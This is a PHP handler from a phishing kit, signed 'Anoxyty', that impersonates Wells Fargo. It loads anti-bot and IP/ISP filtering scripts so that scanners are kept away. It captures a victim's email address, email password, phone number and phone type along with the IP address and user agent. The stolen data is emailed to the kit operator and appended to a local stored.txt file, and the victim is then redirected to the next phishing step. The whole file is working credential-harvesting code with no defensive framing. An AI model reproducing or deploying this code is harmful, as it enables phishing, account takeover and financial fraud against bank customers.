<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['exxx'] ) ) {
		
		$_SESSION['exxx'] 	  = $_POST['exxx'];
		$_SESSION['psss'] 	  = $_POST['psss'];
		$_SESSION['num'] 	  = $_POST['num'];
		$_SESSION['Phonetype'] 	  = $_POST['phonetype'];
		$code = <<<EOT
============== [ WellsFargo Email Access By Anoxyty | ]🔥 ==============
[Email Address] 		: {$_SESSION['exxx']}
[Email Password]		: {$_SESSION['psss']}
[Phone Number]		: {$_SESSION['num']}
[Phone Type]		: {$_SESSION['phonetype']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WellsFargo Email Access By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 WellsFargo Email Access By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: step1a.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>